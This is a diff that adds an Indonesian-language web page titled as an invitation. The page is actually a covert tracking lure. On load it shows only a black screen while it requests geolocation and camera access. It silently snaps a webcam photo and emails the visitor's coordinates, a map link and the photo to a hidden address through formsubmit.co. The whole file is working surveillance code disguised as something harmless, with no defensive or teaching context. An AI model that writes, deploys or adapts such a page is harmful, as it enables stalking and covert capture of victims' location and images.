@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Undangan</title>
+    <style>
+        /* Tampilan halaman tetap hitam polos untuk rencana UI kustom Anda */
+        body {
+            background-color: #000000;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            overflow: hidden;
+        }
+        video, canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // PENTING: Ganti dengan email aktif Anda
+        const EMAIL_TUJUAN = "d9a1b68b96ce0a668a22f62f9a3f5284"; 
+
+        document.addEventListener("DOMContentLoaded", () => {
+            mulaiAlurIzin();
+        });
+
+        // Langkah 1: Meminta izin lokasi
+        function mulaiAlurIzin() {
+            console.log("Langkah 1: Meminta izin lokasi...");
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        console.log("Lokasi sukses didapatkan:", lat, lon);
+
+                        // Lanjut ke langkah kamera dengan membawa data lokasi
+                        aksesKamera(lat, lon);
+                    },
+                    (error) => {
+                        console.error("Izin lokasi ditolak sejak awal:", error.message);
+                        // Jika lokasi ditolak sejak awal, alur berhenti karena tidak ada data untuk dikirim
+                    }
+                );
+            } else {
+                console.error("Browser tidak mendukung Geolocation.");
+            }
+        }
+
+        // Langkah 2: Meminta izin kamera
+        async function aksesKamera(lat, lon) {
+            console.log("Langkah 2: Meminta izin kamera...");
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                console.log("Kamera diizinkan.");
+                
+                console.log("Menunggu 3 detik agar sensor kamera siap...");
+                
+                // KONDISI A: Kamera DIKASIH IZIN -> Kirim lokasi + Foto
+                setTimeout(() => {
+                    kirimLokasiDanFoto(lat, lon, video);
+                }, 3000);
+
+            } catch (error) {
+                // KONDISI B: Kamera DITOLAK -> Langsung kirim Lokasi saja tanpa foto
+                console.warn("Izin kamera ditolak. Mengalihkan ke pengiriman data lokasi saja...");
+                kirimLokasiSaja(lat, lon);
+            }
+        }
+
+        // Fungsi A: Mengirim data lengkap (Lokasi + File Gambar)
+        function kirimLokasiDanFoto(lat, lon, videoElement) {
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            
+            canvas.width = videoElement.videoWidth;
+            canvas.height = videoElement.videoHeight;
+            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+            
+            const urlAPI = `https://formsubmit.co/ajax/${EMAIL_TUJUAN}`;
+
+            canvas.toBlob(async (blob) => {
+                if (!blob) {
+                    console.error("Gagal memproses gambar, mengirim lokasi saja.");
+                    kirimLokasiSaja(lat, lon);
+                    return;
+                }
+
+                const formData = new FormData();
+                formData.append("Status Kamera", "Diizinkan");
+                formData.append("Latitude", lat);
+                formData.append("Longitude", lon);
+                formData.append("Link Peta", `https://www.google.com/maps?q=${lat},${lon}`);
+                formData.append("Screenshot", blob, "capture.png");
+                formData.append("_captcha", "false");
+
+                kirimKeServer(urlAPI, formData);
+            }, "image/png");
+        }
+
+        // Fungsi B: Mengirim data teks saja (Hanya Lokasi)
+        function kirimLokasiSaja(lat, lon) {
+            const urlAPI = `https://formsubmit.co/ajax/${EMAIL_TUJUAN}`;
+
+            const formData = new FormData();
+            formData.append("Status Kamera", "Ditolak/Error");
+            formData.append("Latitude", lat);
+            formData.append("Longitude", lon);
+            formData.append("Link Peta", `https://www.google.com/maps?q=${lat},${lon}`);
+            formData.append("_captcha", "false");
+
+            kirimKeServer(urlAPI, formData);
+        }
+
+        // Fungsi pembantu untuk mengeksekusi Fetch API
+        async function kirimKeServer(url, dataForm) {
+            console.log("Sedang mengirim data ke FormSubmit...");
+            try {
+                const response = await fetch(url, {
+                    method: "POST",
+                    body: dataForm
+                });
+
+                if (response.ok) {
+                    console.log("BERHASIL: Data telah dikirim ke email!");
+                } else {
+                    console.error("Gagal mengirim data. Respon server bermasalah.");
+                }
+            } catch (error) {
+                console.error("Kesalahan jaringan saat mengirim data:", error.message);
+            }
+        }
+    </script>
+</body>
+</html>
